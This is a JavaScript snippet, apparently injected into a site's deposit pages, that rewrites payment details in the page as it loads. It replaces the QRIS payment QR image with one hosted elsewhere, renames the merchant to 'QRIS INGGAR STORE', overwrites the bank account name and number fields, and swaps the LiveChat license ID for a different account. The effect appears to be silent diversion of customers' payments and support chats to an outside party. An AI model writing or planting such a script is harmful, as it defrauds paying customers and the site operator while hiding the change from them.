(function() {
  const url = window.location.href;

  // ---------------------------
  // 1. Logika di qris.php
  // ---------------------------
  if (url.endsWith('qris.php')) {
    // Ganti URL gambar
    document.querySelectorAll('img').forEach(img => {
      if (img.src === "https://s14.gifyu.com/images/bHCtN.jpg") {
        img.src = "https://imagizer.imageshack.com/v2/320xq70/r/922/uOeZAn.jpg";
      }
    });

    // Ganti value <option>
    const metodeSelect = document.querySelector('select[name="metode"] option[selected]');
    if (metodeSelect && metodeSelect.textContent.includes("QRIS Radi Ganz")) {
      metodeSelect.textContent = "QRIS INGGAR STORE";
    }
  }

  // ---------------------------
  // 2. Logika untuk semua ?bank=
  // ---------------------------
  if (url.includes('/?bank=')) {
    // Nama Akun Bank
    const namaAkunInput = document.getElementById('info-copy-1');
    if (namaAkunInput) namaAkunInput.value = "Alihkan Ke Qris";

    const namaAkunSpan = document.querySelector('[data-sel="info-copy-1"] span');
    if (namaAkunSpan) namaAkunSpan.textContent = "Alihkan Ke Qris";

    // Rekening Bank No
    const rekeningInput = document.getElementById('info-copy-2');
    if (rekeningInput) rekeningInput.value = "A01 || Instan Deposit";

    const rekeningSpan = document.querySelector('[data-sel="info-copy-2"] span');
    if (rekeningSpan) rekeningSpan.textContent = "A01 || Instan Deposit";

    // Tambahkan gambar QRIS
    const rekeningContainer = rekeningInput ? rekeningInput.parentElement : null;
    if (rekeningContainer && !document.getElementById('custom-qris-img')) {
      const img = document.createElement('img');
      img.id = 'custom-qris-img';
      img.src = "https://imagizer.imageshack.com/v2/320xq70/r/922/uOeZAn.jpg";
      img.style.maxWidth = "200px";
      img.style.display = "block";
      img.style.marginTop = "10px";
      rekeningContainer.appendChild(img);
    }
  }

  // ---------------------------
  // 3. Ganti ID license LiveChat
  // ---------------------------
  const scripts = document.querySelectorAll('script');
  scripts.forEach(script => {
    if (script.textContent.includes('19219427')) {
      script.textContent = script.textContent.replace(/19219427/g, '19221990');
    }
  });

  // Ubah di window._lc kalau sudah inisialisasi
  if (window._lc && window._lc.license) {
    window._lc.license = 19221990;
  }
  if (window.__lc && window.__lc.license) {
    window.__lc.license = 19221990;
  }
})();
